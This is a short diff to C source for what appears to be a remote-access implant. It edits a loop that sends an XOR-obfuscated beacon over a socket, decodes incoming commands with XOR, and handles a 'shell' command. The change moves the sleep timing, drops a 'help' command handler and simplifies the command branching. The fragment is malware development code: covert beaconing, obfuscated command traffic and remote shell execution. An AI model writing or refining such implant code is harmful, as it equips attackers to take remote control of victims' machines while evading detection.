@@ -82,19 +82,14 @@ int main(void)
 
 	while (connection_established == 0)
 	{
-		sleep(sleeptime);
+		
 		if(strlen(buf) > 0){
-			
+
+			sleep(sleeptime);	
 			send(sock, xorbeacon, strlen(beacon), 0);
 			char* xorbuf = XOR(buf, key, bufsize, keylen);
-			// TODO: Revamp argument parsing (there's a better way! :)
-			if(strncmp(xorbuf, "help\n", 5) == 0)
-			{
-				char* xorhelp = XOR(MSG_HELP, key, strlen(MSG_HELP), keylen);
-				write(sock, xorhelp, strlen(MSG_HELP));
-			}
 			
-			else if(str_starts_with(xorbuf, "shell") == 0)
+			if(str_starts_with(xorbuf, "shell") == 0)
 			{
 
 				int status;
@@ -187,6 +182,7 @@ int main(void)
 			free(xorbuf);
 		}
 		else {
+			sleep(sleeptime);
 			send(sock, xorbeacon, strlen(beacon), 0);
 		}
 	}
